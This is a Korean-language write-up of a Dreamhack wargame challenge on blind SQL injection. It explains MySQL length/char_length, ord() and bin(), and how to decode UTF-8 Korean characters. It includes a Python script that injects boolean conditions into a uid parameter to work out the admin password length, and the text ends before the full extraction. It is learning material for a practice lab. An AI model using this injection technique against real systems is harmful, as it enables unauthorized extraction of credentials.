# Challenge: dreamhack - blind sql injection advanced

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/411
비밀번호는 아스키코드와 한글로 조합되었다는 것을 알 수 있다.

## 추가 학습
### MySQL에서 length 함수와 char_length 함수의 차이
* 둘 다 길이를 구하는 함수지만, 그 기준 단위가 다르다.
* length 함수는 해당 문자열의 바이트 수를 반환한다.
* char_length 함수는 해당 문자열의 "문자 개수"를 반환한다. 즉, '가나다'에 char_length를 사용하면 3이 반환된다. 따라서 length는 인코딩의 영향을 받는 반면, char_length는 인코딩의 영향이 없다는 차이가 있다.

### MySQL에서 ord() 함수, bin() 함수
* ord()는 문자열의 가장 왼쪽 문자를 바이트 단위로 쪼갠다음, 멀티바이트라면 각 바이트를 256의 거듭제곱으로 가중치를 줘 합산하는 공식을 사용한다. 다시 말해, 멀티바이트 문자인 한글도 십진수로 표현한 값을 반환한다는 것이다.
* bin()은 10진수 숫자를 2진수 형태의 문자열로 변환한다. 따라서 ord()와 함께 자주 쓰인다. 추가적으로 bin()은 앞쪽의 불필요한 0은 포함하지 않는다. 따라서 아스키코드를 사용해도 length(bin(아스키문자))는 7 이하 비트가 될 수 있다.


## 한글 문자 처리
* UTF-8 인코딩 된 한글 문자는 보통 3바이트(24비트) 정도로 표현된다. 이 3바이트를 한 번에 2진수 문자열로 표현해 10진수로 변환하고 이를 파이썬 chr() 함수에 넣으면 chr()이 처리할 수 있는 최대 유니코드 코드포인트를 초과하기 때문에 valueError가 난다.
* ValueError: chr() arg not in range(0x110000)
* 따라서 UTF-8 바이트 시퀀스를 2진수 문자열로 변환하지 말고 그대로 bytes 객체로 만들고 decode('utf-8') 함수를 이용해 변환하는 것이 좋다.
    ```python

    # UTF-8 바이트 배열을 각각 8비트 2진수 문자열로 표현
    binary_bytes = ['11101100', '10100010', '10001111']

    # 2진수 문자열을 정수로 변환하여 바이트 배열 생성
    byte_values = [int(b, 2) for b in binary_bytes]
    byte_seq = bytes(byte_values)

    # UTF-8로 디코딩해서 문자로 변환
    char = byte_seq.decode('utf-8')
    print(char)
    ```

## 문제 풀이



* 우선 비밀번호의 길이(문자열 기준)부터 구해보자. admin'으로 따옴표 부분을 닫고 and로 char_length(upw)를 순차적으로 검증하는 방식으로 코드를 짰다.
    ```python
    length = 0
    for i in range(1, 30): 
        uid = f"admin' and char_length(upw)={i} -- "
        res = requests.get(f"{URL}/", params={"uid": uid})
        if "exists" in res.text:
            print(f"UID {uid} exists!")
            length = i
            break
        else:
            print(f"UID {uid} does not exist, stopping.")
    ```

* 실행 결과 length는 13이라는 것을 알 수 있다. 각 문자에 대해 한글인지 아스키코드인지에 따라 바이트 수가 바뀌므로 비트열의 길이도 알아야 한다. 따라서 ord()와 bin(), length()를 중첩시키자.
